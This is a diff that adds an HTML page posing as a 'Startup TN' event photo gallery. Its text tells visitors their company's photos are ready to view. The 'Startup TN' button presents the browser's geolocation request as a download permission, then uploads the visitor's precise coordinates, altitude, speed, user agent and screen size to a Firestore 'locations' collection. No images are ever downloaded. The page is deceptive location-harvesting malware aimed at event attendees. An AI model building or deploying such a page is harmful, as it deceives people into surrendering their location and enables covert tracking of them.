@@ -1,0 +1,208 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Images Gallery</title>
+  <style>
+    :root { --bg:#0f1724; --card:#0b1220; --accent:#38bdf8; color-scheme: dark; }
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,#071021 0%, #081426 100%);font-family:Inter,Segoe UI,system-ui,Arial;}
+    .center{display:flex;align-items:center;justify-content:center;height:100%;padding:20px}
+    .card{width:100%;max-width:840px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:14px;padding:18px;box-shadow:0 6px 30px rgba(2,6,23,0.6);}
+    .row{display:flex;gap:16px;flex-wrap:wrap}
+    .images{flex:1;min-width:260px;display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+    .imgbox{background:#071328;border-radius:8px;overflow:hidden;min-height:120px;display:flex;align-items:center;justify-content:center}
+    .imgbox img{width:100%;height:100%;object-fit:cover;display:block}
+    .controls{width:320px;min-width:240px}
+    h1{margin:0 0 8px 0;font-size:1.2rem;color:#dbeafe}
+    p{color:#9fb3c8;margin:0 0 12px 0;font-size:0.95rem}
+    button{appearance:none;border:0;padding:10px 14px;border-radius:10px;background:var(--accent);color:#022;}
+    .muted{font-size:0.85rem;color:#7f8f9b}
+    .log{margin-top:12px;background:#061423;padding:10px;border-radius:8px;max-height:160px;overflow:auto;font-family:monospace;font-size:12px;color:#bfe9ff}
+    .status{margin-top:8px;font-weight:600}
+    .consent{background:#06222e;padding:12px;border-radius:10px;margin-bottom:12px}
+    .small{font-size:0.85rem;color:#9fb3c8}
+  </style>
+</head>
+<body>
+  <div class="center">
+    <div class="card">
+      <div class="row">
+        <div class="images" id="imageGrid" aria-live="polite">
+          <!-- Images inserted by JS -->
+        </div>
+
+        <div class="controls">
+          <h1>Image gallery</h1>
+          <div class="consent">
+            <div class="small">Thank you for your participation in Startup Tn. We are pleased to inform you that photos from the event, including those of your company's activities, are ready for viewing. Click the button below to continue</div>
+          </div>
+
+          <button id="startBtn">Startup TN</button>
+
+          <div class="status" id="status" style="margin-top:12px">Participator</div>
+          <div class="muted" style="margin-top:8px">You can download all your images,in Your Profile StartupTN Gallery Upload.</div>
+          <div style="display:none" class="log" id="log" aria-live="polite"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Firebase SDK (v9 modular) -->
+  <script type="module">
+    // ---- 1) Replace the config below with your Firebase project settings ----
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+    import {
+      getFirestore, collection, addDoc, serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBUqz3fYgb6AhG4jJumfkRHDmGpByGsDLI",
+      authDomain: "locking-46d1d.firebaseapp.com",
+      projectId: "locking-46d1d",storageBucket: "locking-46d1d.firebasestorage.app",
+  messagingSenderId: "951533820010",
+  appId: "1:951533820010:web:398947aff6fbd6f9f65213",
+  measurementId: "G-S1S8DQ0PV7"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // ---- 2) UI + images ----
+    const imageUrls = [
+      // sample images (use your own or remote images)
+      "https://media.licdn.com/dms/image/v2/C560BAQF7Av_C5R42sA/company-logo_200_200/company-logo_200_200/0/1669960788027?e=2147483647&v=beta&t=dD7lyqPtN6pbcz7TDGCnGSGEE0RTL8aDAVVfxvivFJM",
+      "https://inc42.com/cdn-cgi/image/quality=75/https://asset.inc42.com/2025/10/ftr-2.jpg",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ16znk8iFQ7wwMyqHlMHjxJfyKvlKV43mcpQ&s",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxUZ3T3HYA9tX79Y8GqvaG0wvt6Sxim150eA&s",
+      "https://thepropshopindia.com/exhibition-stall-convergence-india/assets/kaapi-machines.webp"
+    ];
+
+    const imageGrid = document.getElementById("imageGrid");
+    const statusEl = document.getElementById("status");
+    const logEl = document.getElementById("log");
+    const startBtn = document.getElementById("startBtn");
+
+    // Populate image boxes
+    imageUrls.forEach((u, i) => {
+      const box = document.createElement("div");
+      box.className = "imgbox";
+      const img = document.createElement("img");
+      img.src = ""; // lazy load later
+      img.alt = `Image ${i+1}`;
+      box.appendChild(img);
+      imageGrid.appendChild(box);
+    });
+
+    // Simple image loader that cycles and lazy loads images in background
+    function startImageCycle() {
+      const boxes = Array.from(document.querySelectorAll(".imgbox img"));
+      let idx = 0;
+      // start by stagger-loading images
+      boxes.forEach((img, i) => {
+        setTimeout(() => {
+          img.src = imageUrls[i % imageUrls.length];
+          log(`Started loading image ${i+1}`);
+          img.onload = () => log(`Image ${i+1} loaded`);
+          img.onerror = () => log(`Image ${i+1} failed to load`);
+        }, i * 500);
+      });
+
+      // periodically shuffle images to keep the page lively
+      setInterval(() => {
+        boxes.forEach((img, i) => {
+          const next = imageUrls[(idx + i) % imageUrls.length];
+          img.src = next;
+        });
+        idx = (idx + 1) % imageUrls.length;
+      }, 7000);
+    }
+
+    function log(msg) {
+      const time = new Date().toLocaleTimeString();
+      logEl.insertAdjacentHTML("afterbegin", `<div>[${time}] ${escapeHtml(msg)}</div>`);
+    }
+
+    function escapeHtml(s){ return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c])); }
+
+    startImageCycle();
+
+    // ---- 3) Geolocation + Firestore upload (explicit consent) ----
+    async function requestAndUpload() {
+      statusEl.textContent = "Status: requesting Download permission...";
+      log("User initiated Download request");
+
+      // Check support
+      if (!("geolocation" in navigator)) {
+        statusEl.textContent = "Status: Download not supported by browser";
+        log("Downlaod not supported");
+        return;
+      }
+
+      // Show a friendly message while waiting
+      statusEl.textContent = "Status: waiting for user permission (browser prompt)...";
+
+      // Wrap getCurrentPosition in a promise
+      const getPosition = () => new Promise((resolve, reject) => {
+        const opts = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+        navigator.geolocation.getCurrentPosition(resolve, reject, opts);
+      });
+
+      try {
+        const pos = await getPosition();
+        const coords = pos.coords;
+        statusEl.textContent = "Status: Downloading Images...";
+        log(`Got location: lat=${coords.latitude.toFixed(6)}, lon=${coords.longitude.toFixed(6)}, accuracy=${coords.accuracy}m`);
+
+        // Prepare data to store
+        const docData = {
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          accuracy_m: coords.accuracy,
+          altitude: coords.altitude ?? null,
+          altitudeAccuracy: coords.altitudeAccuracy ?? null,
+          heading: coords.heading ?? null,
+          speed: coords.speed ?? null,
+          userAgent: navigator.userAgent,
+          viewport: { width: window.innerWidth, height: window.innerHeight },
+          timestamp_client: new Date().toISOString(),
+          timestamp_server: serverTimestamp()
+        };
+
+        // Add new doc to collection "locations"
+        const col = collection(db, "locations");
+        const addResult = await addDoc(col, docData);
+        statusEl.textContent = "Status: Requested successfully";
+        log(`Uploaded to Firestore (doc id: ${addResult.id})`);
+      } catch (err) {
+        console.error(err);
+        if (err.code === 1 || err.PERMISSION_DENIED) {
+          statusEl.textContent = "Status: permission denied — Download cancelled";
+          log("User denied  permission");
+        } else if (err.code === 3 || err.TIMEOUT) {
+          statusEl.textContent = "Status: timed out";
+          log("Download timed out");
+        } else {
+          statusEl.textContent = "Status: error Downloading";
+          log("Error Donwloading: "); //+ (err.message || err)
+        }
+      }
+    }
+
+    // Hook up UI
+    startBtn.addEventListener("click", async () => {
+      startBtn.disabled = true;
+      startBtn.textContent = "Working...";
+      await requestAndUpload();
+      startBtn.disabled = false;
+      startBtn.textContent = "Downloading Not supported";
+    });
+
+    // Accessibility: warn if not HTTPS
+    if (location.protocol !== "https:" && location.hostname !== "localhost") {
+    //   log("Warning: Page is not served over HTTPS — geolocation may not work.");
+    }
+
+  </script>
+</body>
+</html>
